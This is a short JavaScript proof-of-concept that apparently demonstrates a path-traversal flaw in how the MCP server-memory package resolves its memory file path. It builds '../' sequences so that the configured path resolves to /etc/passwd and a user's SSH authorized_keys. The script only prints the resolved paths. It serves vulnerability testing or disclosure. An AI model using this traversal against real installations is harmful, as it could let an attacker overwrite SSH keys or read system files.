import path from 'path';
import { fileURLToPath } from 'url';

function resolveMemoryPath(envVar, moduleUrl) {
  if (envVar) {
    return path.isAbsolute(envVar)
      ? envVar
      : path.join(path.dirname(fileURLToPath(moduleUrl)), envVar);
  }
  return path.join(path.dirname(fileURLToPath(moduleUrl)), 'memory.jsonl');
}

const fakeModuleUrl = 'file:///home/lhmisme/.npm-global/lib/node_modules/@modelcontextprotocol/server-memory/dist/index.js';
const dir = path.dirname(fileURLToPath(fakeModuleUrl));
const depth = dir.split(path.sep).filter(Boolean).length;
console.log(`Install dir: ${dir}`);
console.log(`Depth from root: ${depth} segments -> need ${depth} "../" to escape to /`);

const traversal = '../'.repeat(depth);

console.log('\n--- Exact traversal to /etc/passwd ---');
const t1 = resolveMemoryPath(traversal + 'etc/passwd', fakeModuleUrl);
console.log(`Resolved: ${t1}`);
console.log(`Matches real /etc/passwd: ${t1 === '/etc/passwd'}`);

console.log('\n--- Exact traversal to real user SSH authorized_keys ---');
const t2 = resolveMemoryPath(traversal + 'home/lhmisme/.ssh/authorized_keys', fakeModuleUrl);
console.log(`Resolved: ${t2}`);
console.log(`Matches real path: ${t2 === '/home/lhmisme/.ssh/authorized_keys'}`);
